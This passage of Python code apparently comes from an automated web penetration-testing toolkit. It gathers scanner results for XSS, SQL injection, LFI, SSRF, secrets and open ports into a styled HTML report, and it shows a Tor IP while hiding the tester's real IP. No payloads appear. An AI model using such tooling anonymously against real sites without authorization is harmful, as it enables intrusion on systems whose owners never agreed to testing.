    "mass":    int("${ST_MASS}"),    "deser":    int("${ST_DESER}"),
    "oauth":   int("${ST_OAUTH}"),   "session":  int("${ST_SESSION}"),
    "bl":      int("${ST_BL}"),      "f403":     int("${ST_403}"),
    "total_c": int("${TOTAL_CRITICAL}"),
    "total_h": int("${TOTAL_HIGH}"),
    "total_m": int("${TOTAL_MEDIUM}"),
    "total_l": int("${TOTAL_LOW}"),
    "total_i": int("${TOTAL_INFO}"),
    "total":   int("${TOTAL_ALL}"),
    "cc":      int("${CVSS_CRIT}"),  "ch": int("${CVSS_HIGH}"),
    "cm":      int("${CVSS_MED}"),   "cl": int("${CVSS_LOW}"),
}

# ── READ FINDINGS ──────────────────────────────────────────────────
def read_findings(fpath, pattern, maxlines=20):
    lines = []
    if not os.path.isfile(fpath): return lines
    try:
        with open(fpath, 'r', errors='ignore') as f:
            for l in f:
                if re.search(pattern, l, re.I):
                    lines.append(l.strip()[:150].replace('<','&lt;').replace('>','&gt;'))
                    if len(lines) >= maxlines: break
    except: pass
    return lines

nuclei_c = read_findings(f"{OUT_DIR}/vulns/nuclei_main.txt", "critical", 20)
nuclei_h = read_findings(f"{OUT_DIR}/vulns/nuclei_main.txt", "high", 20)
nuclei_m = read_findings(f"{OUT_DIR}/vulns/nuclei_main.txt", "medium", 15)
nuclei_l = read_findings(f"{OUT_DIR}/vulns/nuclei_main.txt", "low", 10)
xss_f    = read_findings(f"{OUT_DIR}/xss/dalfox.txt", "POC|XSS", 15)
xss_v    = read_findings(f"{OUT_DIR}/xss/xss_verified.txt", "CONFIRMED", 10)
sqli_f   = read_findings(f"{OUT_DIR}/sqli", "injectable", 10) if os.path.isdir(f"{OUT_DIR}/sqli") else []
lfi_f    = read_findings(f"{OUT_DIR}/lfi/lfi_results.txt", "CONFIRMED", 10)
ssrf_f   = read_findings(f"{OUT_DIR}/ssrf/ssrf_results.txt", "POTENTIAL", 10)
cors_f   = read_findings(f"{OUT_DIR}/cors/cors_results.txt", "CONFIRMED|MISCONFIG", 10)
sec_f    = read_findings(f"{OUT_DIR}/js_analysis/secrets.txt", r"\[!\]", 10)
sens_f   = read_findings(f"{OUT_DIR}/recon/sensitive_files.txt", ".", 15)
dns_f    = read_findings(f"{OUT_DIR}/recon/dns_misconfig.txt", "!!!|MISSING|BERHASIL", 10)
cloud_f  = read_findings(f"{OUT_DIR}/recon/cloud_misconfig.txt", "!!!", 10)
idor_f   = read_findings(f"{OUT_DIR}/auth/business_logic.txt", "IDOR", 10)
deser_f  = read_findings(f"{OUT_DIR}/auth/deserialize.txt", "POTENTIAL|CONFIRMED", 10)
oauth_f  = read_findings(f"{OUT_DIR}/auth/oauth_test.txt", "REDIRECT|BYPASS|!!!", 10)
bypass_f = read_findings(f"{OUT_DIR}/auth/bypass_403.txt", "BYPASS", 10)
open_ports = read_findings(f"{OUT_DIR}/ports/nmap_full.nmap", "open", 20)

def findings_html(items, cls="critical"):
    if not items:
        return f'<div class="no-find">No findings terverifikasi</div>'
    return "".join(f'<div class="fi {cls}">{i}</div>' for i in items)

NOW = datetime.now().strftime('%d %B %Y, %H:%M WIB')

# ── Chart.js minified (embed inline) ──────────────────────────────
# Download chart.js content or use inline minimal version
CHARTJS = ""
try:
    import urllib.request
    with urllib.request.urlopen("https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js", timeout=10) as r:
        CHARTJS = r.read().decode('utf-8')
    print("[OK] Chart.js downloaded")
except:
    print("[!] Chart.js offline -- pakai CDN fallback")
    CHARTJS = ""  # Will use CDN fallback

CHARTJS_TAG = f"<script>{CHARTJS}</script>" if CHARTJS else '<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>'

# ── HTML TEMPLATE ──────────────────────────────────────────────────
HTML = f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cassiopeia Report — {DOMAIN}</title>
{CHARTJS_TAG}
<style>
:root{{
  --bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;
  --text:#c9d1d9;--text2:#8b949e;
  --c:#ff4d4d;--h:#ff8c00;--m:#ffd700;--lo:#4caf50;--i:#58a6ff;
  --cy:#39d0d8;--pu:#bc8cff;
}}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;font-size:13px}}
a{{color:var(--cy);text-decoration:none}}
/* HEADER */
.hdr{{background:linear-gradient(135deg,#0d1117,#1a0a2e,#0d1117);
  border-bottom:1px solid var(--border);padding:32px 20px;text-align:center}}
.hdr pre{{font-size:.45em;line-height:1.15;color:var(--cy);display:inline-block}}
.hdr h1{{color:var(--c);font-size:1.6em;margin-top:8px;letter-spacing:2px}}
.hdr .meta{{color:var(--text2);margin-top:6px;font-size:.82em;line-height:1.8}}
.hdr .ver{{color:var(--pu);font-size:.75em;margin-top:4px}}
.warn-bar{{background:#3d1a1a;border-top:1px solid var(--c);border-bottom:1px solid var(--c);
  color:var(--c);padding:8px;text-align:center;font-size:.8em;letter-spacing:3px;font-weight:bold}}
/* LAYOUT */
.container{{max-width:1400px;margin:0 auto;padding:20px}}
.g2{{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:16px 0}}
.g3{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin:16px 0}}
.g4{{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:16px 0}}
.gfind{{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px;margin:16px 0}}
/* CARD */
.card{{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:18px}}
.card h2{{font-size:.9em;color:var(--cy);margin-bottom:14px;
  border-bottom:1px solid var(--border);padding-bottom:8px;text-transform:uppercase;letter-spacing:1px}}
/* STAT CARDS */
.sc{{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
  padding:14px;text-align:center;transition:transform .2s}}
.sc:hover{{transform:translateY(-3px)}}
.sn{{font-size:2.2em;font-weight:bold;line-height:1}}
.sl{{color:var(--text2);font-size:.7em;margin-top:4px;text-transform:uppercase;letter-spacing:1px}}
.pb{{background:var(--bg3);border-radius:4px;height:6px;margin-top:8px;overflow:hidden}}
.pf{{height:100%;border-radius:4px;transition:width 1s}}
.sc.cc{{border-color:var(--c)}}.sc.cc .sn{{color:var(--c)}}
.sc.hh{{border-color:var(--h)}}.sc.hh .sn{{color:var(--h)}}
.sc.mm{{border-color:var(--m)}}.sc.mm .sn{{color:var(--m)}}
.sc.ll{{border-color:var(--lo)}}.sc.ll .sn{{color:var(--lo)}}
/* DONUT */
.dw{{display:flex;flex-direction:column;align-items:center;gap:12px}}
.dc{{position:relative;width:160px;height:160px}}
.dc-center{{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
  text-align:center;pointer-events:none}}
.dc-center .big{{font-size:1.6em;font-weight:bold;color:var(--text)}}
.dc-center .small{{font-size:.6em;color:var(--text2)}}
.legend{{list-style:none;font-size:.75em;width:100%}}
.legend li{{display:flex;align-items:center;gap:6px;margin:4px 0;color:var(--text2)}}
.dot{{width:10px;height:10px;border-radius:50%;flex-shrink:0}}
/* FINDING CARDS */
.fcard{{background:var(--bg2);border-radius:8px;padding:14px;
  border-left:4px solid var(--border);transition:transform .2s}}
.fcard:hover{{transform:translateY(-2px)}}
.fcard.cc{{border-left-color:var(--c)}}
.fcard.hh{{border-left-color:var(--h)}}
.fcard.mm{{border-left-color:var(--m)}}
.fcard.ll{{border-left-color:var(--lo)}}
.fcard.ii{{border-left-color:var(--i)}}
.fcard.pp{{border-left-color:#e84393}}
.ftitle{{font-size:.82em;font-weight:bold;margin:8px 0 2px}}
.fnum{{font-size:1.8em;font-weight:bold;line-height:1}}
.fdesc{{color:var(--text2);font-size:.7em;margin-top:4px}}
/* BADGE */
.badge{{display:inline-block;padding:2px 7px;border-radius:10px;
  font-size:.65em;font-weight:bold;letter-spacing:.5px}}
.bc{{background:#3d0000;color:var(--c);border:1px solid var(--c)}}
.bh{{background:#2d1a00;color:var(--h);border:1px solid var(--h)}}
.bm{{background:#2d2700;color:var(--m);border:1px solid var(--m)}}
.bl{{background:#001a00;color:var(--lo);border:1px solid var(--lo)}}
.bi{{background:#001a3d;color:var(--i);border:1px solid var(--i)}}
.bp{{background:#3d0020;color:#e84393;border:1px solid #e84393}}
/* FINDING ITEMS */
.fi{{background:var(--bg3);border-radius:5px;padding:8px 12px;
  margin:5px 0;font-size:.76em;word-break:break-all;border-left:3px solid var(--border)}}
.fi.critical{{border-left-color:var(--c);background:#1a0808}}
.fi.high{{border-left-color:var(--h);background:#1a1008}}
.fi.medium{{border-left-color:var(--m);background:#1a1a08}}
.fi.low{{border-left-color:var(--lo);background:#081a08}}
.fi.info{{border-left-color:var(--i)}}
.no-find{{color:var(--lo);font-size:.8em;padding:8px 0;opacity:.8}}
/* TABS */
.tabs{{display:flex;gap:3px;margin-bottom:0;flex-wrap:wrap}}
.tab{{padding:5px 14px;border-radius:6px 6px 0 0;cursor:pointer;
  background:var(--bg3);color:var(--text2);font-size:.75em;
  border:1px solid var(--border);border-bottom:none;transition:all .2s}}
.tab:hover{{color:var(--cy)}}
.tab.active{{background:var(--bg2);color:var(--cy);border-color:var(--cy)}}
.tc{{display:none;border:1px solid var(--border);border-radius:0 8px 8px 8px;
  padding:14px;background:var(--bg2)}}
.tc.active{{display:block}}
/* TABLE */
table{{width:100%;border-collapse:collapse;font-size:.8em}}
th{{background:var(--bg3);color:var(--cy);padding:9px;text-align:left;
  border-bottom:1px solid var(--border);font-size:.8em;text-transform:uppercase}}
td{{padding:7px 9px;border-bottom:1px solid var(--bg3)}}
tr:hover td{{background:var(--bg3)}}
/* REMEDIATION */
.rem{{background:var(--bg2);border-radius:8px;padding:14px;
  margin:8px 0;border-left:4px solid var(--border)}}
.rem h3{{font-size:.85em;margin-bottom:8px}}
.rem ul{{padding-left:18px;color:var(--text2);font-size:.78em;line-height:1.8}}
.rem code{{background:var(--bg3);padding:1px 5px;border-radius:3px;
  color:var(--cy);font-size:.85em}}
/* OPSEC */
.obadge{{display:inline-flex;align-items:center;gap:6px;
  background:var(--bg3);border:1px solid var(--lo);border-radius:20px;
  padding:5px 12px;font-size:.75em;color:var(--lo);margin:3px}}
/* CHART CONTAINER */
.cc-box{{position:relative;height:240px}}
/* PROGRESS TABLE */
.risk-row{{display:flex;align-items:center;gap:10px;margin:6px 0}}
.risk-label{{width:80px;font-size:.8em;color:var(--text2)}}
.risk-bar{{flex:1;background:var(--bg3);border-radius:4px;height:18px;overflow:hidden}}
.risk-fill{{height:100%;border-radius:4px;display:flex;align-items:center;
  padding-left:6px;font-size:.7em;font-weight:bold;color:#000;transition:width 1s}}
.risk-count{{width:35px;text-align:right;font-size:.8em;font-weight:bold}}
/* CAIDO */
.caido-box{{background:linear-gradient(135deg,#0d1117,#1a0a2e);
  border:1px solid var(--pu);border-radius:8px;padding:20px;
  margin:20px 0;text-align:center}}
.caido-box h2{{color:var(--pu);margin-bottom:8px}}
.cbtn{{display:inline-block;padding:8px 20px;background:var(--pu);
  color:#000;border-radius:6px;font-weight:bold;font-size:.82em;
  margin:6px;cursor:pointer;border:none;font-family:inherit;transition:opacity .2s}}
.cbtn:hover{{opacity:.85}}
.cbtn.sec{{background:transparent;color:var(--pu);border:1px solid var(--pu)}}
/* FOOTER */
.footer{{background:var(--bg2);border-top:1px solid var(--border);
  padding:16px;text-align:center;color:var(--text2);font-size:.75em;margin-top:30px}}
/* SECTION DIVIDER */
.sdiv{{border-top:1px solid var(--border);margin:24px 0 16px;
  display:flex;align-items:center;gap:10px}}
.sdiv::before{{content:'';flex:1;height:1px;background:var(--border)}}
.sdiv span{{color:var(--cy);font-size:.75em;text-transform:uppercase;
  letter-spacing:2px;white-space:nowrap}}
.sdiv::after{{content:'';flex:1;height:1px;background:var(--border)}}
/* CVSS badge */
.cvss{{display:inline-block;padding:2px 8px;border-radius:4px;
  font-size:.7em;font-weight:bold;margin-left:6px}}
.cvss.c10{{background:#ff0000;color:#fff}}
.cvss.c9{{background:#ff4d4d;color:#fff}}
.cvss.c8{{background:#ff8c00;color:#fff}}
.cvss.c7{{background:#ffa500;color:#000}}
.cvss.c6{{background:#ffd700;color:#000}}
.cvss.c5{{background:#c8e600;color:#000}}
.cvss.c4{{background:#a8d500;color:#000}}
.cvss.c3{{background:#4caf50;color:#fff}}
/* PRINT / PDF */
@media print{{
  body{{background:#fff!important;color:#000!important}}
  .hdr{{background:#1a1a2e!important;color:#fff!important;page-break-after:always}}
  .warn-bar{{background:#8b0000!important;color:#fff!important}}
  .card,.sc,.fcard,.rem{{background:#f8f8f8!important;border-color:#ddd!important}}
  .fi{{background:#f0f0f0!important}}
  .tab{{display:none}}
  .tc{{display:block!important}}
  .footer{{page-break-before:always}}
}}
@media(max-width:768px){{
  .g2,.g3,.g4{{grid-template-columns:1fr}}
  .hdr pre{{font-size:.28em}}
}}
</style>
</head>
<body>

<!-- HEADER -->
<div class="hdr">
<pre>
 ██████╗ █████╗ ███████╗███████╗██╗ ██████╗ ██████╗ ███████╗██╗ █████╗
██╔════╝██╔══██╗██╔════╝██╔════╝██║██╔═══██╗██╔══██╗██╔════╝██║██╔══██╗
██║     ███████║███████╗███████╗██║██║   ██║██████╔╝█████╗  ██║███████║
██║     ██╔══██║╚════██║╚════██║██║██║   ██║██╔═══╝ ██╔══╝  ██║██╔══██║
╚██████╗██║  ██║███████║███████║██║╚██████╔╝██║     ███████╗██║██║  ██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝
        ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
        ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
        ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║
        ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║
        ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║
        ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝
</pre>
<h1>WEB PENETRATION TEST REPORT</h1>
<div class="meta">
  Target: <strong style="color:var(--cy)">{TARGET}</strong><br>
  Domain: {DOMAIN} &nbsp;|&nbsp; IP: {IP}<br>
  Tanggal: {NOW} &nbsp;|&nbsp; 40+ Tools &nbsp;|&nbsp; 15 Phase + Addon
</div>
<div class="ver">
  v3.0.0 &nbsp;|&nbsp; by Xyra77
  &nbsp;&nbsp;
  <span class="obadge">&#128274; Tor IP: {TOR_IP}</span>
  <span class="obadge">&#128274; Real IP: {REAL_IP} tersembunyi</span>
</div>
</div>

<div class="warn-bar">!! DOKUMEN RAHASIA &mdash; AUTHORIZED PENETRATION TESTING ONLY !!</div>

<div class="container">

<!-- SEVERITY SUMMARY CARDS -->
<div class="g4" style="margin-top:20px">
  <div class="sc cc">
    <div class="sn" id="n-crit">{S['total_c']}</div>
    <div class="sl">Critical</div>
    <div class="pb"><div class="pf" style="width:100%;background:var(--c)"></div></div>
  </div>
  <div class="sc hh">
    <div class="sn" id="n-high">{S['total_h']}</div>
    <div class="sl">High</div>
    <div class="pb"><div class="pf" style="width:80%;background:var(--h)"></div></div>
  </div>
  <div class="sc mm">
    <div class="sn" id="n-med">{S['total_m']}</div>
    <div class="sl">Medium</div>
    <div class="pb"><div class="pf" style="width:55%;background:var(--m)"></div></div>
  </div>
  <div class="sc ll">
    <div class="sn" id="n-low">{S['total_l']}</div>
    <div class="sl">Low</div>
    <div class="pb"><div class="pf" style="width:35%;background:var(--lo)"></div></div>
  </div>
</div>

<!-- RISK BAR + 3 DONUTS -->
<div class="g2">
  <!-- Risk breakdown bar -->
  <div class="card">
    <h2>Risk Breakdown</h2>
    <div style="margin-top:8px">
      <div class="risk-row">
        <div class="risk-label">Critical</div>
        <div class="risk-bar"><div class="risk-fill" style="width:{min(100, int(S['total_c']*100/max(S['total'],1)))}%;background:var(--c)">{S['total_c']}</div></div>
        <div class="risk-count" style="color:var(--c)">{S['total_c']}</div>
      </div>
      <div class="risk-row">
        <div class="risk-label">High</div>
        <div class="risk-bar"><div class="risk-fill" style="width:{min(100, int(S['total_h']*100/max(S['total'],1)))}%;background:var(--h)">{S['total_h']}</div></div>
        <div class="risk-count" style="color:var(--h)">{S['total_h']}</div>
      </div>
      <div class="risk-row">
        <div class="risk-label">Medium</div>
        <div class="risk-bar"><div class="risk-fill" style="width:{min(100, int(S['total_m']*100/max(S['total'],1)))}%;background:var(--m)">{S['total_m']}</div></div>
        <div class="risk-count" style="color:var(--m)">{S['total_m']}</div>
      </div>
      <div class="risk-row">
        <div class="risk-label">Low</div>
        <div class="risk-bar"><div class="risk-fill" style="width:{min(100, int(S['total_l']*100/max(S['total'],1)))}%;background:var(--lo)">{S['total_l']}</div></div>
        <div class="risk-count" style="color:var(--lo)">{S['total_l']}</div>
      </div>
      <div class="risk-row">
        <div class="risk-label">Info</div>
        <div class="risk-bar"><div class="risk-fill" style="width:{min(100, int(S['total_i']*100/max(S['total'],1)))}%;background:var(--i)">{S['total_i']}</div></div>
        <div class="risk-count" style="color:var(--i)">{S['total_i']}</div>
      </div>
    </div>
    <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border)">
      <table>
        <tr><td>IP Target</td><td style="color:var(--cy)">{IP}</td></tr>
        <tr><td>IP via Tor</td><td style="color:var(--lo)">{TOR_IP}</td></tr>
        <tr><td>IP Asli</td><td style="color:var(--c)">{REAL_IP} (hidden)</td></tr>
        <tr><td>Total Finding</td><td style="font-weight:bold">{S['total']}</td></tr>
        <tr><td>Tools Dipakai</td><td>40+ Tools, 15 Phase</td></tr>
      </table>
    </div>
  </div>

  <!-- 3 Donuts -->
  <div style="display:grid;grid-template-rows:1fr 1fr;gap:12px">

    <!-- Row 1: Risk + Vuln Type donuts -->
    <div class="g2" style="margin:0">
      <div class="card" style="padding:14px">
        <h2>Risk Distribution</h2>
        <div class="dw">
          <div class="dc">
            <canvas id="riskDonut"></canvas>
            <div class="dc-center">
              <div class="big">{S['total']}</div>
              <div class="small">Total</div>
            </div>
          </div>
          <ul class="legend">
            <li><span class="dot" style="background:var(--c)"></span>Critical: <strong>{S['total_c']}</strong></li>
            <li><span class="dot" style="background:var(--h)"></span>High: <strong>{S['total_h']}</strong></li>
            <li><span class="dot" style="background:var(--m)"></span>Medium: <strong>{S['total_m']}</strong></li>
            <li><span class="dot" style="background:var(--lo)"></span>Low: <strong>{S['total_l']}</strong></li>
            <li><span class="dot" style="background:var(--i)"></span>Info: <strong>{S['total_i']}</strong></li>
          </ul>
        </div>
      </div>
      <div class="card" style="padding:14px">
        <h2>Vuln Types</h2>
        <div class="dw">
          <div class="dc"><canvas id="vulnDonut"></canvas></div>
          <ul class="legend">
            <li><span class="dot" style="background:var(--c)"></span>XSS: {S['xss']+S['bxss']}</li>
            <li><span class="dot" style="background:var(--h)"></span>SQLi: {S['sqli']}</li>
            <li><span class="dot" style="background:var(--m)"></span>SSRF: {S['ssrf']}</li>
            <li><span class="dot" style="background:var(--pu)"></span>LFI: {S['lfi']}</li>
            <li><span class="dot" style="background:var(--cy)"></span>Code Inj: {S['php']+S['py']+S['jsij']}</li>
            <li><span class="dot" style="background:var(--lo)"></span>Auth/BL: {S['idor']+S['mass']+S['oauth']}</li>
            <li><span class="dot" style="background:#e84393"></span>DNS/Cloud: {S['spf']+S['dmarc']+S['cloud']}</li>
          </ul>
        </div>
      </div>
    </div>

    <!-- Row 2: OWASP donut -->
    <div class="card" style="padding:14px">
      <h2>OWASP Top 10 2021</h2>
      <div style="display:flex;align-items:center;gap:16px">
        <div class="dc" style="width:130px;height:130px;flex-shrink:0">
          <canvas id="owaspDonut"></canvas>
        </div>
        <ul class="legend">
          <li><span class="dot" style="background:#ff4d4d"></span>A01 Broken Access: {S['idor']+S['lfi']}</li>
          <li><span class="dot" style="background:#ff6b6b"></span>A02 Crypto: {S['sec']}</li>
          <li><span class="dot" style="background:#ff8c00"></span>A03 Injection: {S['xss']+S['sqli']}</li>
          <li><span class="dot" style="background:#ffa500"></span>A05 Misconfig: {S['hdr']+S['spf']+S['dmarc']}</li>
          <li><span class="dot" style="background:#ffd700"></span>A07 Auth Fail: {S['oauth']+S['session']}</li>
          <li><span class="dot" style="background:#4caf50"></span>A08 Deserial: {S['deser']}</li>
          <li><span class="dot" style="background:#39d0d8"></span>A10 SSRF: {S['ssrf']}</li>
        </ul>
      </div>
    </div>
  </div>
</div>

<!-- BAR CHARTS ROW -->
<div class="g2">
  <div class="card">
    <h2>Recon Statistics</h2>
    <div class="cc-box"><canvas id="reconBar"></canvas></div>
  </div>
  <div class="card">
    <h2>CVSS Score Distribution</h2>
    <div class="cc-box"><canvas id="cvssBar"></canvas></div>
  </div>
</div>

<!-- FINDING CARDS GRID -->
<div class="sdiv"><span>Findings Overview</span></div>
<div class="gfind">
"""

# Finding cards data
cards = [
    ("cc","bc","XSS Browser Confirmed", S['bxss'],     "Alert fired di real browser","var(--c)"),
    ("cc","bc","LFI Path Traversal",    S['lfi'],      "File system access confirmed","var(--c)"),
    ("cc","bc","PHP Code Injection",    S['php'],      "Server-side RCE confirmed","var(--c)"),
    ("cc","bc","Cloud Misconfiguration",S['cloud'],    "S3/GCP/Azure bucket public","var(--c)"),
    ("cc","bc","Deserialization",       S['deser'],    "PHP/Java/Python/ViewState","var(--c)"),
    ("hh","bh","XSS Dalfox",           S['xss'],      "Reflected/Stored XSS POC","var(--h)"),
    ("hh","bh","SQL Injection",         S['sqli'],     "Injectable parameters","var(--h)"),
    ("hh","bh","SSRF",                  S['ssrf'],     "Server-Side Request Forgery","var(--h)"),
    ("hh","bh","CORS Misconfiguration", S['cors'],     "Cross-Origin policy bypass","var(--h)"),
    ("hh","bh","IDOR",                  S['idor'],     "Insecure Direct Object Ref","var(--h)"),
    ("hh","bh","JS Secrets",            S['sec'],      "API keys & credentials","var(--h)"),
    ("hh","bh","SPF/DMARC Missing",     S['spf']+S['dmarc'], "Email spoofing risk","var(--h)"),
    ("hh","bh","Zone Transfer",         S['zone'],     "DNS info leak","var(--h)"),
    ("mm","bm","Prototype Pollution",   S['pp'],       "JS prototype chain issue","var(--m)"),
    ("mm","bm","Mass Assignment",       S['mass'],     "Field injection ke object","var(--m)"),
    ("mm","bm","OAuth Issues",          S['oauth'],    "Open redirect / PKCE","var(--m)"),
    ("mm","bm","Session Issues",        S['session'],  "Cookie flags missing","var(--m)"),
    ("mm","bm","Business Logic",        S['bl'],       "Negative price / overflow","var(--m)"),
    ("mm","bm","GraphQL",               S['gql'],      "Introspection enabled","var(--m)"),
    ("ll","bl","Missing Sec Headers",   S['hdr'],      "HSTS/CSP/X-Frame missing","var(--lo)"),
    ("ll","bl","Sensitive Files",       S['sens'],     ".env, backup, config exposed","var(--lo)"),
    ("ll","bl","403 Bypass",            S['f403'],     "Header manipulation bypass","var(--lo)"),
]
for cls, bcls, title, count, desc, color in cards:
    HTML += f"""  <div class="fcard {cls}">
    <div class="badge {bcls}">{cls.upper().replace('CC','CRITICAL').replace('HH','HIGH').replace('MM','MEDIUM').replace('LL','LOW')}</div>
    <div class="ftitle">{title}</div>
    <div class="fnum" style="color:{color}">{count}</div>
    <div class="fdesc">{desc}</div>
  </div>
"""

HTML += """</div>

<!-- NUCLEI TABS -->
<div class="sdiv"><span>Nuclei Findings</span></div>
<div class="card">
  <div class="tabs">
"""
tabs_data = [
    ("critical", f"Critical ({S['ncrit']})", nuclei_c),
    ("high",     f"High ({S['nhigh']})",     nuclei_h),
    ("medium",   f"Medium ({S['nmed']})",    nuclei_m),
    ("low",      f"Low ({S['nlow']})",       nuclei_l),
]
for i,(tid,tlabel,_) in enumerate(tabs_data):
    active = "active" if i==0 else ""
    HTML += f'    <div class="tab {active}" onclick="switchTab(\'{tid}\',this)">{tlabel}</div>\n'

HTML += "  </div>\n"
for i,(tid,_,items) in enumerate(tabs_data):
    active = "active" if i==0 else ""
    sev = "critical" if "crit" in tid else tid
    HTML += f'  <div id="tab-{tid}" class="tc {active}">\n'
    HTML += findings_html(items, sev)
    HTML += "\n  </div>\n"
HTML += "</div>\n"

# Verified findings sections
sections = [
    ("XSS Findings", [
        ("critical", "XSS Browser Confirmed (Playwright verified)", xss_v),
        ("high",     "XSS Dalfox POC", xss_f),
    ]),
    ("Injection Findings", [
        ("high",   "SQL Injection", sqli_f),
        ("critical","LFI Path Traversal", lfi_f),
        ("high",   "SSRF Candidates", ssrf_f),
    ]),
    ("Auth & Logic", [
        ("high",   "CORS Misconfiguration", cors_f),
        ("high",   "IDOR", idor_f),
        ("medium", "OAuth Issues", oauth_f),
        ("critical","Insecure Deserialization", deser_f),
        ("medium", "403 Bypass", bypass_f),
    ]),
    ("Infra & Recon", [
        ("high",   "DNS Misconfiguration", dns_f),
        ("critical","Cloud Misconfiguration", cloud_f),
        ("high",   "JS Secrets Found", sec_f),
        ("low",    "Sensitive Files", sens_f),
    ]),
    ("Open Ports", [
        ("info",   "Port Scanning Results", open_ports),
    ]),
]

for sec_title, subsections in sections:
    HTML += f'\n<div class="sdiv"><span>{sec_title}</span></div>\n'
    for sev, sub_title, items in subsections:
        bcls = {"critical":"bc","high":"bh","medium":"bm","low":"bl","info":"bi"}.get(sev,"bi")
        HTML += f'<div class="card" style="margin-bottom:10px">\n'
        HTML += f'  <h2><span class="badge {bcls}">{sev.upper()}</span> &nbsp;{sub_title}</h2>\n'
        HTML += findings_html(items, sev)
        HTML += "\n</div>\n"

# Stats table
HTML += f"""
<div class="sdiv"><span>Full Statistics</span></div>
<div class="card">
  <table>
    <thead><tr><th>Kategori</th><th>Jumlah</th><th>Severity</th><th>CVSS</th></tr></thead>
    <tbody>
"""
stats_table = [
    ("Subdomains Ditemukan",    S['subs'],           "bi","INFO",  "-"),
    ("Live Hosts",              S['live'],           "bi","INFO",  "-"),
    ("Total URLs",              S['urls'],           "bi","INFO",  "-"),
    ("URLs dengan Parameter",   S['params'],         "bi","INFO",  "-"),
    ("Cert Transparency",       S['cert'],           "bi","INFO",  "-"),
    ("Nuclei Critical",         S['ncrit'],          "bc","CRITICAL","9.5"),
    ("Nuclei High",             S['nhigh'],          "bh","HIGH",  "7.5"),
    ("Nuclei Medium",           S['nmed'],           "bm","MEDIUM","5.5"),
    ("Nuclei Low",              S['nlow'],           "bl","LOW",   "3.0"),
    ("XSS Dalfox",              S['xss'],            "bh","HIGH",  "6.1"),
    ("XSS Browser Confirmed",   S['bxss'],           "bc","CRITICAL","8.8"),
    ("SQL Injection",           S['sqli'],           "bc","CRITICAL","9.8"),
    ("SSRF",                    S['ssrf'],           "bh","HIGH",  "8.6"),
    ("LFI / Path Traversal",    S['lfi'],            "bc","CRITICAL","7.5"),
    ("SSTI",                    S['ssti'],           "bc","CRITICAL","9.8"),
    ("Prototype Pollution",     S['pp'],             "bm","MEDIUM","6.5"),
    ("PHP Code Injection",      S['php'],            "bc","CRITICAL","9.8"),
    ("Python Code Injection",   S['py'],             "bh","HIGH",  "8.1"),
    ("JS Code Injection",       S['jsij'],           "bh","HIGH",  "8.1"),
    ("CORS Misconfiguration",   S['cors'],           "bh","HIGH",  "8.1"),
    ("GraphQL Introspection",   S['gql'],            "bm","MEDIUM","5.3"),
    ("JS Secrets Found",        S['sec'],            "bh","HIGH",  "9.1"),
    ("Sensitive Files",         S['sens'],           "bm","MEDIUM","7.5"),
    ("Missing Sec Headers",     S['hdr'],            "bl","LOW",   "5.3"),
    ("SPF Missing",             S['spf'],            "bh","HIGH",  "7.5"),
    ("DMARC Missing",           S['dmarc'],          "bh","HIGH",  "7.5"),
    ("Zone Transfer",           S['zone'],           "bh","HIGH",  "7.5"),
    ("Cloud Misconfiguration",  S['cloud'],          "bc","CRITICAL","9.1"),
    ("IDOR",                    S['idor'],           "bh","HIGH",  "8.1"),
    ("Mass Assignment",         S['mass'],           "bh","HIGH",  "8.1"),
    ("Deserialization",         S['deser'],          "bc","CRITICAL","9.8"),
    ("OAuth Issues",            S['oauth'],          "bm","MEDIUM","6.1"),
    ("Session Issues",          S['session'],        "bm","MEDIUM","5.5"),
    ("Business Logic",          S['bl'],             "bl","LOW",   "4.5"),
    ("403 Bypass",              S['f403'],           "bm","MEDIUM","7.3"),
]
for cat, count, bcls, sev_label, cvss in stats_table:
    cvss_cls = ""
    try:
        v = float(cvss)
        if v >= 9: cvss_cls = "c9"
        elif v >= 8: cvss_cls = "c8"
        elif v >= 7: cvss_cls = "c7"
        elif v >= 6: cvss_cls = "c6"
        elif v >= 5: cvss_cls = "c5"
        elif v >= 4: cvss_cls = "c4"
        elif v >= 3: cvss_cls = "c3"
    except: pass
    cvss_badge = f'<span class="cvss {cvss_cls}">{cvss}</span>' if cvss_cls else cvss
    HTML += f'      <tr><td>{cat}</td><td><strong>{count}</strong></td><td><span class="badge {bcls}">{sev_label}</span></td><td>{cvss_badge}</td></tr>\n'

HTML += "    </tbody>\n  </table>\n</div>\n"

# Remediation (dynamic - only show what was found)
HTML += '\n<div class="sdiv"><span>Remediation Recommendations</span></div>\n'
HTML += '<p style="color:var(--text2);font-size:.8em;margin-bottom:12px">Hanya menampilkan rekomendasi berdasarkan vuln yang beneran found.</p>\n'

remeds = []
if S['xss']+S['bxss'] > 0:
    remeds.append(("var(--c)","bc","CRITICAL",f"XSS — Cross-Site Scripting ({S['xss']+S['bxss']} finding)",[
        "Implementasi CSP ketat: <code>default-src 'self'; script-src 'nonce-{random}'</code>",
        "Encode output: <code>htmlspecialchars()</code> PHP, <code>DOMPurify</code> JS",
